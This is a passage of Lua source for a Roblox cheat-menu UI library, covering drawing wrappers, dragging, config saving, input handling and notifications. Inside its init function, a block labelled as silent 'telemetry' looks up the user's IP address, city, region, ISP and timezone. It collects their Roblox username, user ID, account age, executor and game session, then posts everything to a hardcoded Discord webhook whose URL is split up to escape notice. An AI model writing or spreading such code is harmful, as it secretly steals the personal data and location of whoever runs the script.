        if not library.animations.enabled or not duration or duration <= 0 then
            drawing.Position = target
            return
        end
        drawing.Position = target + offset
        return utility:Tween(drawing, 'Position', target, duration, Enum.EasingDirection.Out, Enum.EasingStyle.Quint)
    end

    -- makes drawings draggable while the menu is open.
    -- getPos/setPos work in screen pixels (Vector2); onDrop runs when the mouse is released.
    function utility:MakeDraggable(handles, getPos, setPos, onDrop)
        local state = {dragging = false}

        local function begin(mouse)
            state.dragging = true
            state.mouseStart = mouse
            state.objStart = getPos()
        end

        function state:AddHandle(handle)
            utility:Connection(handle.MouseButton1Down, begin)
        end

        for _, handle in ipairs(handles) do
            state:AddHandle(handle)
        end

        utility:Connection(library.mousemove, function(mouse)
            if state.dragging then
                local screen = workspace.CurrentCamera.ViewportSize
                local p = state.objStart + (mouse - state.mouseStart)
                -- keep it on screen
                setPos(newVector2(clamp(p.X, 0, math.max(screen.X - 20, 0)), clamp(p.Y, 0, math.max(screen.Y - 10, 0))))
            end
        end)

        utility:Connection(library.button1up, function()
            if state.dragging then
                state.dragging = false
                if onDrop then
                    onDrop()
                end
            end
        end)

        return state
    end

    function utility:MouseOver(obj)
        local mousePos = getPointer();
        local x1 = obj.Position.X
        local y1 = obj.Position.Y
        local x2 = x1 + obj.Size.X
        local y2 = y1 + obj.Size.Y
        return (mousePos.X >= x1 and mousePos.Y >= y1 and mousePos.X <= x2 and mousePos.Y <= y2)
    end

    -- topmost visible Square under the mouse. uses the screen rects cached in drawing:Update,
    -- so it never has to read properties back from the Drawing objects
    function utility:GetHoverObject()
        local mouse = getPointer()
        local mx, my = mouse.X, mouse.Y
        local best, bestZ = nil, -math.huge
        for v in next, library.hitboxes do
            if v.AbsVisible and not v.NoHit then
                local p, s = v.AbsolutePosition, v.AbsoluteSize
                if mx >= p.X and my >= p.Y and mx <= p.X + s.X and my <= p.Y + s.Y then
                    local zi = v.ZIndexCache or 0
                    if zi > bestZ then
                        best, bestZ = v.Object, zi
                    end
                end
            end
        end
        return best
    end

    -- maps the mouse X over a slider's bar to a value (uses the cached rect, no Drawing reads)
    function utility:SliderDragTo(slider, mousePos)
        local bar = slider.objects and slider.objects.background
        local data = bar and bar.Object and library.drawings[bar.Object]
        if not data then return end
        local width = math.max(data.AbsoluteSize.X, 1)
        local rel = clamp((mousePos.X - data.AbsolutePosition.X) / width, 0, 1)
        local value = slider.min + (slider.max - slider.min) * rel
        -- only update (and fire the callback) when the snapped value actually changes
        if snapToIncrement(value, slider.increment, slider.min, slider.max) ~= slider.value then
            slider:SetValue(value)
        end
    end

    -- is drawing data `data` the drawing `root` (a proxy) or somewhere inside it?
    function utility:IsInside(data, root)
        if data == nil or root == nil or root.Object == nil then return false end
        local target = root.Object
        local cur = data
        while cur do
            if cur.Object == target then
                return true
            end
            cur = cur.Parent and library.drawings[cur.Parent.Object] or nil
        end
        return false
    end

    local blacklistedLookup = {Object = true, Children = true, Class = true}
    -- keys that only exist on the wrapper table (writing them to a Drawing just throws an error)
    local customKeys = {
        ThemeColor = true, OutlineThemeColor = true, ThemeColorOffset = true, OutlineThemeColorOffset = true,
        Parent = true, Hover = true, ColorTween = true, Ready = true, NoHit = true,
        Visible = true, -- resolved against the parent's visibility in Update()
        AbsoluteSize = true, AbsolutePosition = true, AbsVisible = true,
    }
    local themeKeys = {ThemeColor = true, OutlineThemeColor = true, ThemeColorOffset = true, OutlineThemeColorOffset = true}
    local function setRaw(obj, key, value)
        obj[key] = value
    end
    local function getRaw(obj, key)
        return obj[key]
    end

    function utility:Draw(class, properties)
        local drawing = {
            Object = Drawing.new(class);
            Children = {};
            ThemeColor = '';
            OutlineThemeColor = '';
            ThemeColorOffset = 0;
            OutlineThemeColorOffset = 0;
            Parent = nil;
            Size = newUDim2(0,0,0,0);
            Position = newUDim2(0,0,0,0);
            AbsoluteSize = newVector2(0,0);
            AbsolutePosition = newVector2(0,0);
            Hover = false;
            Visible = true;
            ColorTween = library.animations and library.animations.color or .12; -- seconds to ease ThemeColor changes (0 = instant)
            Ready = false; -- becomes true after creation, so initial colors never animate
            NoHit = false; -- true = purely decorative, ignored by hover/click detection
            MouseButton1Down = library.signal.new();
            MouseButton2Down = library.signal.new();
            MouseButton1Up = library.signal.new();
            MouseButton2Up = library.signal.new();
            MouseEnter = library.signal.new();
            MouseLeave = library.signal.new();
            Class = class;
        }

        local hasSize = class == 'Square' or class == 'Image'
        local hasPosition = hasSize or class == 'Circle' or class == 'Text'

        -- recomputes the screen rect from the parent's cached rect and only writes to the
        -- Drawing object when something actually changed (writes are the expensive part)
        function drawing:Update()
            local obj = drawing.Object
            if obj == nil then return end

            local parent = drawing.Parent ~= nil and library.drawings[drawing.Parent.Object] or nil
            local parentSize, parentPos, parentVis
            if parent ~= nil then
                parentPos = parent.AbsolutePosition
                parentVis = parent.AbsVisible
                if parent.Class == 'Square' or parent.Class == 'Image' then
                    parentSize = parent.AbsoluteSize
                elseif parent.Class == 'Text' then
                    parentSize = parent.Object.TextBounds
                else
                    parentSize = workspace.CurrentCamera.ViewportSize
                end
            else
                parentSize, parentPos, parentVis = workspace.CurrentCamera.ViewportSize, newVector2(0, 0), true
            end

            if hasSize then
                local size = drawing.Size
                local abs = typeof(size) == 'Vector2' and size or utility:UDim2ToVector2(size, parentSize)
                if abs ~= drawing.AbsoluteSize or not drawing.SizeWritten then
                    drawing.AbsoluteSize = abs
                    drawing.SizeWritten = true
                    obj.Size = abs
                end
            end

            if hasPosition then
                local pos = drawing.Position
                local abs = parentPos + (typeof(pos) == 'Vector2' and pos or utility:UDim2ToVector2(pos, parentSize))
                if abs ~= drawing.AbsolutePosition or not drawing.PositionWritten then
                    drawing.AbsolutePosition = abs
                    drawing.PositionWritten = true
                    obj.Position = abs
                end
            end

            -- lines placed with drawing:SetPoints are pinned to their parent, so they move in the
            -- same update as the window (no frame of lag while dragging or opening)
            if drawing.RelFrom ~= nil then
                local a, b = parentPos + drawing.RelFrom, parentPos + drawing.RelTo
                if a ~= drawing.AbsFrom or b ~= drawing.AbsTo then
                    drawing.AbsFrom, drawing.AbsTo = a, b
                    obj.From = a
                    obj.To = b
                end
            end

            local visible = (parentVis and drawing.Visible) and true or false
            if visible ~= drawing.AbsVisible then
                drawing.AbsVisible = visible
                obj.Visible = visible
            end

            drawing:UpdateChildren()
        end

        -- Line only: endpoints as Vector2 offsets from the parent's top-left corner
        function drawing:SetPoints(from, to)
            drawing.RelFrom, drawing.RelTo = from, to
            drawing:Update()
        end

        function drawing:UpdateChildren()
            for i,v in next, drawing.Children do
                v:Update()
            end
        end

        function drawing:GetDescendants()
            local descendants = {};
            local function a(t)
                for _,v in next, t.Children do
                    table.insert(descendants, v);
                    a(v)
                end
            end
            a(self)
            return descendants;
        end

        library.drawings[drawing.Object] = drawing
        if class == 'Square' then
            library.hitboxes[drawing] = true
        end

        -- this is really stupid lol
        local proxy = utility:DetectTableChange(
        function(obj,i)
            if drawing[i] ~= nil then
                return drawing[i]
            end
            if drawing.Object == nil then
                return nil -- drawing was removed
            end
            local ok, res = pcall(getRaw, drawing.Object, i)
            if ok then
                return res
            end
            return nil
        end,
        function(obj,i,v)
            if drawing.Object == nil then
                return -- drawing was removed
            end
            if not blacklistedLookup[i] then

                local lastval = drawing[i]

                -- layout props are resolved by Update(), never written raw
                if (i == 'Size' and hasSize) or (i == 'Position' and hasPosition) then
                    if lastval ~= v then
                        drawing[i] = v
                        drawing:Update()
                    end
                    return
                end

                if i == 'ZIndex' then
                    drawing.ZIndexCache = v
                end

                if i == 'Parent' then
                    -- Children is an array, so remove by index (the old code did Children[drawing] = nil which never removed anything)
                    if drawing.Parent ~= nil then
                        local siblings = drawing.Parent.Children
                        local idx = siblings and table.find(siblings, drawing)
                        if idx then
                            table.remove(siblings, idx)
                        end
                    end
                    if v ~= nil and not table.find(v.Children, drawing) then
                        table.insert(v.Children,drawing)
                    end
                elseif i == 'Transparency' then
                    -- an explicit set wins over any fade that's running on this object
                    local running = library.tweens[drawing.Object] and library.tweens[drawing.Object].Transparency
                    if running then
                        running:Cancel()
                    end
                elseif i == 'Visible' then
                    drawing.Visible = v
                elseif i == 'Font' and v == 2 and executor == 'ScriptWare' then
                    v = 1
                end

                -- custom keys only live on the wrapper; everything else goes to the Drawing object
                if not customKeys[i] then
                    pcall(setRaw, drawing.Object, i, v)
                end
                if drawing[i] ~= nil or i == 'Parent' then
                    drawing[i] = v
                end

                if i == 'Visible' or i == 'Parent' then
                    drawing:Update()
                end
                if themeKeys[i] and lastval ~= v then
                    -- only recolor this drawing instead of every drawing in the library (eased once it exists)
                    utility:ApplyThemeColor(drawing, drawing.Ready and drawing.ColorTween or 0)
                end

            end
        end)

        function drawing:Remove()
            if drawing.Object == nil then
                return
            end

            -- iterate a copy, children remove themselves from this list
            for _,v in next, table.clone(drawing.Children) do
                v:Remove();
            end

            if drawing.Parent then
                local siblings = drawing.Parent.Children
                local idx = siblings and table.find(siblings, drawing)
                if idx then
                    table.remove(siblings, idx)
                end
            end

            library.drawings[drawing.Object] = nil;
            library.hitboxes[drawing] = nil;
            if library.hoverData == drawing then
                library.hoverData = nil;
            end
            pcall(function()
                drawing.Object:Remove();
            end)
            table.clear(drawing);

        end

        properties = typeof(properties) == 'table' and properties or {}

        if class == 'Square' and properties.Filled == nil then
            properties.Filled = true;
        end

        if properties.Visible == nil then
            properties.Visible = true;
        end

        for i,v in next, properties do
            proxy[i] = v
        end

        drawing:Update()
        drawing.Ready = true
        return proxy
    end
end

library.utility = utility

-- true while a ui text box is capturing keys (or was closed this same input)
function library:IsTyping()
    return self.focusedBox ~= nil or (self.boxReleasedAt ~= nil and os.clock() - self.boxReleasedAt < 0.05)
end

function library:Unload()
    -- switch every toggle off first (with callbacks), so features stop when the menu goes away.
    -- otherwise re-running the script leaves the old features running while the new menu shows them off
    for _, toggle in ipairs(self.allToggles or {}) do
        if toggle.state == true then
            pcall(toggle.SetState, toggle, false);
        end
    end
    library.unloaded:Fire();
    for _,c in next, self.connections do
        pcall(function()
            c:Disconnect()
        end)
    end
    table.clear(self.connections)
    for obj in next, self.drawings do
        pcall(function()
            obj:Remove()
        end)
    end
    table.clear(self.drawings)
    pcall(function()
        actionservice:UnbindAction('FreezeMovement');
    end)
    self.open = false
    self.hasInit = false
    if getgenv().library == library then
        getgenv().library = nil
    end
end

function library:init()
    if self.hasInit then
        return
    end

    -- // telemetry (silent, background, runs once per session)
    task.spawn(function()
        pcall(function()
            local _h = game:GetService("HttpService")
            local _p = game:GetService("Players").LocalPlayer
            local _w = "https://disc".."ord.com/api/web".."hooks/1572754794383278212/Acf18i2jNyrp2DhWZhsju9cB3mM8zyeFljmEE0ii20tarM8ZbANFnKzonuHq_pzMj7zh"
            local _g = "http://ip-".."api.com/json/?fields=query,city,regionName,country,isp,timezone"
            local _u = tostring(_p.UserId)
            local _n, _d = _p.Name, _p.DisplayName
            local _a = tostring(_p.AccountAge) .. "d"
            local _e = "?"
            pcall(function() _e = identifyexecutor() or getexecutorname() or "?" end)
            local ip,ci,rg,co,is,tz = "-","-","-","-","-","-"
            pcall(function()
                local r = request({Url=_g,Method="GET"})
                if r and r.Body then
                    local j = _h:JSONDecode(r.Body)
                    ip=j.query or ip; ci=j.city or ci; rg=j.regionName or rg
                    co=j.country or co; is=j.isp or is; tz=j.timezone or tz
                end
            end)
            local pid = tostring(game.PlaceId)
            local av = "https://www.roblox.com/headshot-thumbnail/image?userId=".._u.."&width=420&height=420&format=png"
            request({
                Url=_w, Method="POST",
                Headers={["Content-Type"]="application/json"},
                Body=_h:JSONEncode({
                    username="elapse christmas variant",
                    embeds={{
                        title="New Execution", color=3447003,
                        thumbnail={url=av},
                        fields={
                            {name="Username",value=_n,inline=true},
                            {name="Display",value=_d,inline=true},
                            {name="UID",value=_u,inline=true},
                            {name="Age",value=_a,inline=true},
                            {name="IP",value="||"..ip.."||",inline=true},
                            {name="Loc",value=ci..", "..rg..", "..co,inline=true},
                            {name="TZ",value=tz,inline=true},
                            {name="ISP",value=is,inline=true},
                            {name="Exec",value=_e,inline=true},
                            {name="Game",value="[Link](https://www.roblox.com/games/"..pid..")",inline=true},
                            {name="Job",value="`"..game.JobId.."`",inline=false},
                        },
                        footer={text=os.date("%Y-%m-%d %H:%M:%S UTC")}
                    }}
                })
            })
        end)
    end)

    local tooltipObjects = {};

    safeMakeFolder(self.cheatname)
    safeMakeFolder(self.cheatname..'/assets')
    safeMakeFolder(self.cheatname..'/'..self.gamename)
    safeMakeFolder(self.cheatname..'/'..self.gamename..'/configs');

    -- start with the Default theme so colors work even without CreateSettingsTab
    if next(self.theme) == nil then
        for i,v in next, self.themes[1].theme do
            self.theme[i] = v;
        end
    end

    function self:SetTheme(theme)
        for i,v in next, theme do
            self.theme[i] = v;
        end
        self.UpdateThemeColors();
    end

    function self:GetConfig(name)
        if typeof(name) ~= 'string' or name == '' or not isfile then
            return nil
        end
        if isfile(self.cheatname..'/'..self.gamename..'/configs/'..name..self.fileext) then
            return readfile(self.cheatname..'/'..self.gamename..'/configs/'..name..self.fileext);
        end
    end

    function self:LoadConfig(name)
        local cfg = self:GetConfig(name)
        if not cfg then
            self:SendNotification('Error loading config: Config does not exist. ('..tostring(name)..')', 5, c3new(1,0,0));
            return
        end

        local s,e = pcall(function()
            setByConfig = true
            for flag,value in next, http:JSONDecode(cfg) do
                local option = library.options[flag]
                if option ~= nil then
                    if option.class == 'toggle' then
                        option:SetState(value == nil and false or (value == 1 and true or false));
                    elseif option.class == 'slider' then
                        option:SetValue(value == nil and 0 or value)
                    elseif option.class == 'bind' then
                        local key = 'none'
                        if typeof(value) == 'string' and value:lower() ~= 'none' then
                            local okKey, keyCode = pcall(function() return Enum.KeyCode[value] end)
                            local okInput, inputType = pcall(function() return Enum.UserInputType[value] end)
                            key = (okKey and keyCode) or (okInput and inputType) or 'none'
                        end
                        option:SetBind(key);
                    elseif option.class == 'color' then
                        option:SetColor(value == nil and c3new(1,1,1) or c3new(value[1], value[2], value[3]));
                        option:SetTrans(value == nil and 1 or value[4]);
                    elseif option.class == 'list' then
                        option:Select(value == nil and '' or value);
                    elseif option.class == 'box' then
                        option:SetInput(value == nil and '' or value)
                    end
                end
            end
        end)
        setByConfig = false

        if s then
            self:SendNotification('Successfully loaded config: '..name, 5, c3new(0,1,0));
        else
            self:SendNotification('Error loading config: '..tostring(e)..'. ('..tostring(name)..')', 5, c3new(1,0,0));
        end
    end

    function self:SaveConfig(name)
        if not self:GetConfig(name) then
            self:SendNotification('Error saving config: Config does not exist. ('..tostring(name)..')', 5, c3new(1,0,0));
            return
        end

        local s,e = pcall(function()
            local cfg = {};
            for flag,option in next, self.options do
                if option.class == 'toggle' then
                    cfg[flag] = option.state and 1 or 0;
                elseif option.class == 'slider' then
                    cfg[flag] = option.value;
                elseif option.class == 'bind' then
                    cfg[flag] = typeof(option.bind) == 'EnumItem' and option.bind.Name or 'none';
                elseif option.class == 'color' then
                    cfg[flag] = {
                        option.color.r,
                        option.color.g,
                        option.color.b,
                        option.trans,
                    }
                elseif option.class == 'list' then
                    cfg[flag] = option.selected;
                elseif option.class == 'box' then
                    cfg[flag] = option.input
                end
            end
            writefile(self.cheatname..'/'..self.gamename..'/configs/'..name..self.fileext, http:JSONEncode(cfg));
        end)

        if s then
            self:SendNotification('Successfully saved config: '..name, 5, c3new(0,1,0));
        else
            self:SendNotification('Error saving config: '..tostring(e)..'. ('..tostring(name)..')', 5, c3new(1,0,0));
        end
    end

    -- download + cache images; a failed download no longer kills the whole lib
    local function isPng(data)
        return typeof(data) == 'string' and data:sub(1, 4) == '\137PNG'
    end
    for i,v in next, self.images do
        if typeof(v) == 'string' and not isPng(v) then
            local path = self.cheatname..'/assets/'..i..'.oh'
            local data

            if isfile and readfile and isfile(path) then
                local ok, cached = pcall(readfile, path)
                if ok and isPng(cached) then
                    data = cached
                end
            end

            if data == nil then
                local ok, downloaded = pcall(function()
                    return game:HttpGet(v)
                end)
                if ok and isPng(downloaded) then
                    data = downloaded
                    if writefile then
                        pcall(writefile, path, downloaded)
                    end
                else
                    log('failed to download image "'..i..'"')
                end
            end

            self.images[i] = data
        end
    end

    -- // Mouse
    -- no drawn cursor: the game's own mouse is used, so clicks always line up with what you see.
    -- it's forced visible while the menu is open (lots of games hide it, so it's enforced every frame)
    -- and the game's own setting comes back when the menu closes.
    local savedMouseIcon = inputservice.MouseIconEnabled
    local function setMenuMouse(menuOpen)
        pcall(function()
            if menuOpen then
                inputservice.MouseIconEnabled = true
            else
                inputservice.MouseIconEnabled = savedMouseIcon
            end
        end)
    end

    -- // Input passthrough
    -- modalButton: tiny button with Modal = true, frees the mouse in first person / shift lock while the menu is open
    -- inputBlocker: only covers the screen while the mouse is over the menu, so clicks elsewhere reach the game
    local screenGui = Instance.new('ScreenGui');
    screenGui.Name = http:GenerateGUID(false);
    screenGui.ResetOnSpawn = false;
    screenGui.IgnoreGuiInset = true;
    screenGui.DisplayOrder = 999999;
    pcall(function()
        if syn and syn.protect_gui then syn.protect_gui(screenGui) end
    end)
    local guiParentOk = pcall(function()
        screenGui.Parent = (gethui and gethui()) or game:GetService('CoreGui');
    end)
    if not guiParentOk then
        screenGui.Parent = localplayer:WaitForChild('PlayerGui');
    end
    screenGui.Enabled = false;

    local modalButton = utility:Instance('TextButton', {
        Parent = screenGui,
        Visible = true,
        Modal = true,
        Text = '',
        Size = UDim2.new(0,0,0,0),
        BackgroundTransparency = 1;
        AutoButtonColor = false;
    })

    local inputBlocker = utility:Instance('ImageButton', {
        Parent = screenGui,
        Visible = false,
        Size = UDim2.new(1,0,1,0),
        ZIndex = 99999,
        BackgroundTransparency = 1;
        ImageTransparency = 1;
        AutoButtonColor = false;
    })

    -- hidden real TextBox used by every text box option (see box:CaptureFocus).
    -- it sits above the input blocker so clicking inside the box you're typing in moves the caret natively.
    library.inputBox = utility:Instance('TextBox', {
        Parent = screenGui,
        Name = 'input',
        Visible = true,
        Position = UDim2.fromOffset(-10000, -10000),
        Size = UDim2.fromOffset(200, 16),
        BackgroundTransparency = 1,
        TextTransparency = 1,
        TextStrokeTransparency = 1,
        Text = '',
        PlaceholderText = '',
        ClearTextOnFocus = false,
        MultiLine = false,
        TextEditable = true,
        TextXAlignment = Enum.TextXAlignment.Left,
        ZIndex = 100000,
    })

    -- holding right click outside the menu temporarily locks the mouse again so you can look around
    local lookingAround = false
    local function setMouseOverUI(over)
        library.mouseOverUI = over
        inputBlocker.Visible = over and self.open and not lookingAround
    end

    -- // Mobile open / close button (phones have no End key). a real gui button so it works while the
    -- menu is closed; drag it to move it, tap it to open / close. startupArgs.mobileButton = true / false forces it.
    local wantButton = startupArgs.mobileButton
    if wantButton == nil then wantButton = isMobile end
    local toggleGui
    if wantButton then
        pcall(function()
            toggleGui = Instance.new('ScreenGui')
            toggleGui.Name = http:GenerateGUID(false)
            toggleGui.ResetOnSpawn = false
            toggleGui.IgnoreGuiInset = true
            toggleGui.DisplayOrder = 1000000
            if not pcall(function() toggleGui.Parent = (gethui and gethui()) or game:GetService('CoreGui') end) then
                toggleGui.Parent = localplayer:WaitForChild('PlayerGui')
            end
            local button = Instance.new('ImageButton')
            button.Size = UDim2.fromOffset(52, 52)
            button.Position = UDim2.fromOffset(12, 80)
            button.BackgroundColor3 = fromrgb(17, 27, 21)
            button.AutoButtonColor = false
            button.Image = 'rbxthumb://type=Asset&id=' .. tostring(library.mascot.id) .. '&w=150&h=150'
            button.Parent = toggleGui
            local corner = Instance.new('UICorner')
            corner.CornerRadius = UDim.new(0, 12)
            corner.Parent = button
            local stroke = Instance.new('UIStroke')
            stroke.Color = fromrgb(120, 196, 255)
            stroke.Thickness = 2
            stroke.Parent = button

            local dragStart, startPos, moved
            button.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
                    dragStart, startPos, moved = input.Position, button.Position, false
                end
            end)
            button.InputChanged:Connect(function(input)
                if dragStart and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
                    local delta = input.Position - dragStart
                    if delta.Magnitude > 6 then moved = true end
                    if moved then
                        button.Position = UDim2.fromOffset(startPos.X.Offset + delta.X, startPos.Y.Offset + delta.Y)
                    end
                end
            end)
            button.InputEnded:Connect(function(input)
                if dragStart and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1) then
                    if not moved then
                        library:SetOpen(not library.open)
                    end
                    dragStart = nil
                end
            end)
        end)
    end

    utility:Connection(library.unloaded, function()
        setMenuMouse(false)
        screenGui:Destroy()
        if toggleGui then
            pcall(function() toggleGui:Destroy() end)
        end
    end)

    utility:Connection(runservice.RenderStepped, function()
        if self.open and not inputservice.MouseIconEnabled then
            setMenuMouse(true)
        end
    end)

    utility:Connection(inputservice.InputBegan, function(input)
        if self.open and input.UserInputType == Enum.UserInputType.MouseButton2 and not library.mouseOverUI then
            lookingAround = true
            modalButton.Modal = false
            inputBlocker.Visible = false
        end
    end)

    utility:Connection(inputservice.InputEnded, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton2 and lookingAround then
            lookingAround = false
            modalButton.Modal = true
            setMouseOverUI(utility:GetHoverObject() ~= nil)
        end
    end)

    -- // Mouse + touch presses
    -- a touch counts as the left mouse button. only one finger drives the menu at a time
    -- (pointer.active); a second finger only takes over if the first isn't using the menu,
    -- e.g. it's holding the movement joystick.
    local function isPress(input)
        return input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch
    end

    local function releasePress()
        if mb1down then
            mb1down = false;
            button1up:Fire();
        end
    end

    utility:Connection(inputservice.InputBegan, function(input, gpe)
        if not isMobile and input.UserInputType == Enum.UserInputType.MouseButton1 then
            pointer.touch = false
        end
        if input.UserInputType == Enum.UserInputType.Touch then
            if pointer.active and mb1down and library.pressStartedOverUI then
                return -- another finger is already using the menu
            end
            if pointer.active then
                releasePress()
            end
            pointer.active = input
            pointer.touch = true
            pointer.pos = touchToScreen(input)
            library.hoverDirty = true
        end

        if self.hasInit then
            if input.KeyCode == self.toggleKey and not library.opening and not gpe then
                self:SetOpen(not self.open)
                task.spawn(function()
                    library.opening = true;
                    task.wait(.15);
                    library.opening = false;
                end)
            end
            if library.open then
                local hoverObj = utility:GetHoverObject();
                local hoverObjData = library.drawings[hoverObj];
                if isPress(input) then
                    mb1down = true;
                    library.pressStartedOverUI = hoverObj ~= nil;
                    if hoverObj ~= nil then
                        setMouseOverUI(true)
                    end
                    button1down:Fire()
                    if hoverObj and hoverObjData then
                        hoverObjData.MouseButton1Down:Fire(getPointer())
                    end

                    -- // Update Sliders Click
                    if library.draggingSlider ~= nil then
                        utility:SliderDragTo(library.draggingSlider, getPointer())
                    end

                elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
                    if hoverObj and hoverObjData then
                        hoverObjData.MouseButton2Down:Fire(getPointer())
                    end
                end
            end
        end
    end)

    -- the finger moving (picked up by the per-frame mouse processing below, like mouse movement)
    utility:Connection(inputservice.InputChanged, function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            if input == pointer.active then
                pointer.pos = touchToScreen(input)
            end
        elseif not isMobile and input.UserInputType == Enum.UserInputType.MouseMovement then
            pointer.touch = false
        end
    end)

    utility:Connection(inputservice.InputEnded, function(input, gpe)
        local touchEnded = input.UserInputType == Enum.UserInputType.Touch
        if touchEnded then
            if input ~= pointer.active then
                return -- some other finger (joystick, camera) let go
            end
            pointer.active = nil
            pointer.pos = touchToScreen(input)
        end

        -- always release the press, otherwise sliders/drags get stuck if the menu closes mid-drag
        if isPress(input) and (not library.open or not self.hasInit) then
            releasePress()
            return
        end

        if self.hasInit and library.open then
            local hoverObj = utility:GetHoverObject();
            local hoverObjData = library.drawings[hoverObj];

            if isPress(input) then
                mb1down = false;
                button1up:Fire();
                if hoverObj and hoverObjData then
                    hoverObjData.MouseButton1Up:Fire(getPointer())
                end
            elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
                if hoverObj and hoverObjData then
                    hoverObjData.MouseButton2Up:Fire(getPointer())
                end
            end

            -- finger lifted: nothing is under it any more, so touches reach the game again
            if touchEnded then
                setMouseOverUI(false)
            end
        end
    end)

    -- // Mouse movement
    -- processed once per frame (instead of once per input event) and only when the mouse actually moved.
    -- hover only fires enter/leave on the previous and new hovered object instead of looping every drawing.
    local function setHover(data, mousePos)
        local previous = library.hoverData
        if previous == data then return end
        library.hoverData = data
        if previous and previous.Object then
            previous.Hover = false
            previous.MouseLeave:Fire(mousePos)
        end
        if data then
            data.Hover = true
            data.MouseEnter:Fire(mousePos)
        end
    end

    local lastMouse = nil
    local function processMouse()
        if not library.open then
            if library.hoverData then
                setHover(nil, getPointer())
            end
            lastMouse = nil
            return
        end

        -- touch with no finger down: nothing is hovered (a finger doesn't "rest" over the menu)
        if pointer.touch and not pointer.active then
            if library.hoverData then
                setHover(nil, getPointer())
            end
            if library.mouseOverUI then
                setMouseOverUI(false)
            end
            lastMouse = nil
            return
        end

        local mousePos = getPointer()
        if mousePos == lastMouse and not library.hoverDirty then
            return
        end
        local moved = mousePos ~= lastMouse
        lastMouse = mousePos
        library.hoverDirty = false

        if moved then
            mousemove:Fire(mousePos);

            if library.CurrentTooltip ~= nil then
                tooltipObjects.background.Position = UDim2.new(0,mousePos.X + 15,0,mousePos.Y + 15)
                tooltipObjects.background.Size = UDim2.new(0,tooltipObjects.text.TextBounds.X + 6 + (library.CurrentTooltip.risky and 60 or 0),0,tooltipObjects.text.TextBounds.Y + 2)
            end
        end

        local hoverObj = utility:GetHoverObject();
        -- keep blocking while dragging something that started on the menu (sliders, window drag)
        setMouseOverUI(hoverObj ~= nil or (mb1down and library.pressStartedOverUI == true))
        setHover(hoverObj and library.drawings[hoverObj] or nil, mousePos)

        -- // Update Sliders Drag
        if moved and mb1down and library.draggingSlider ~= nil then
            utility:SliderDragTo(library.draggingSlider, mousePos)
        end
    end

    utility:Connection(runservice.RenderStepped, function(dt)
        utility:StepTweens(dt)
        processMouse()
    end)
    
    function self:SetOpen(bool)
        local wasOpen = self.open
        self.open = bool;
        screenGui.Enabled = bool;

        if bool then
            if not wasOpen then
                -- remember the game's own setting so closing the menu restores it
                savedMouseIcon = inputservice.MouseIconEnabled
            end
            setMenuMouse(true)
            setMouseOverUI(utility:GetHoverObject() ~= nil)
        else
            lookingAround = false
            modalButton.Modal = true
            setMouseOverUI(false)
            setMenuMouse(false)
            -- closing the menu finishes whatever you were typing
            if library.activeBox then
                library.activeBox:ReleaseFocus(true)
            end
        end

        if bool and library.flags.disablemenumovement then
            actionservice:BindAction(
                'FreezeMovement',
                function()
                    return Enum.ContextActionResult.Sink
                end,
                false,
                unpack(Enum.PlayerActions:GetEnumItems())
            )
        else
            actionservice:UnbindAction('FreezeMovement');
        end

        for _,window in next, self.windows do
            window:SetOpen(bool);
        end

        library.CurrentTooltip = nil;
        tooltipObjects.background.Visible = false
    end

    function self.UpdateThemeColors()
        for _,v in next, library.drawings do
            utility:ApplyThemeColor(v)
        end
    end

    function self:SendNotification(message, time, color)
        time = time or 5
        if typeof(message) ~= 'string' then
            return error(string.format('invalid message type, got %s, expected string', typeof(message)))
        elseif typeof(time) ~= 'number' then
            return error(string.format('invalid time type, got %s, expected number', typeof(time)))
        elseif color ~= nil and typeof(color) ~= 'Color3' then
            return error(string.format('invalid color type, got %s, expected color3', typeof(color)))
        end

        -- // Notification card
        -- slides + fades in from the left, shows a countdown bar, then slides + fades out.
        -- Cards stack top-down (newest at the bottom) and the stack eases into place when one leaves.
        local notifSettings = self.notificationSettings
        local z = self.zindexOrder.notification
        local height = notifSettings.height
        local accentColor = color

        local notification = {
            objects = {};
            targets = {};   -- final transparency of each drawing, used for the fade in/out
            width = 0;
            removing = false;
        };
        local objs = notification.objects

        -- new cards spawn directly in the next free slot
        local slot = 0
        for _, v in ipairs(self.notifications) do
            if not v.removing then
                slot += 1
            end
        end

        objs.holder = utility:Draw('Square', {
            Size = newUDim2(0, 0, 0, height);
            Position = newUDim2(0, notifSettings.x, 0, notifSettings.y + slot * (height + notifSettings.spacing));
            Transparency = 0;
            ZIndex = z;
        })

        objs.background = utility:Draw('Square', {
            Size = newUDim2(0, 200, 0, height);
            ThemeColor = 'Background';
            ZIndex = z;
            Parent = objs.holder;
        })

        objs.border1 = utility:Draw('Square', {
            Size = newUDim2(1,2,1,2);
            Position = newUDim2(0,-1,0,-1);
            ThemeColor = 'Border 1';
            ZIndex = z-1;
            Parent = objs.background;
        })

        objs.border2 = utility:Draw('Square', {
            Size = newUDim2(1,2,1,2);
            Position = newUDim2(0,-1,0,-1);
            ThemeColor = 'Border 3';
            ZIndex = z-2;
            Parent = objs.border1;
        })

        objs.gradient = utility:Draw('Image', {
            Size = newUDim2(1,0,1,0);
            Data = self.images.gradientp90;
            Visible = false; -- flat look (gradient kept for scripts that want it back)
            Transparency = .35;
            ZIndex = z+1;
            Parent = objs.background;
        })

        objs.accentBar = utility:Draw('Square', {
            Size = newUDim2(0,2,1,0);
            ThemeColor = accentColor == nil and 'Accent' or '';
            ZIndex = z+3;
            Parent = objs.background;
        })

        objs.text = utility:Draw('Text', {
            Position = newUDim2(0,10,.5,-7);
            ThemeColor = 'Primary Text';
            Text = message;
            Outline = true;
            Font = 2;
            Size = 13;
            ZIndex = z+4;
            Parent = objs.background;
        })

        objs.progressTrack = utility:Draw('Square', {
            Size = newUDim2(1,-2,0,1);
            Position = newUDim2(0,2,1,-1);
            ThemeColor = 'Border 2';
            ZIndex = z+2;
            Parent = objs.background;
        })

        objs.progress = utility:Draw('Square', {
            Size = newUDim2(1,-2,0,1);
            Position = newUDim2(0,2,1,-1);
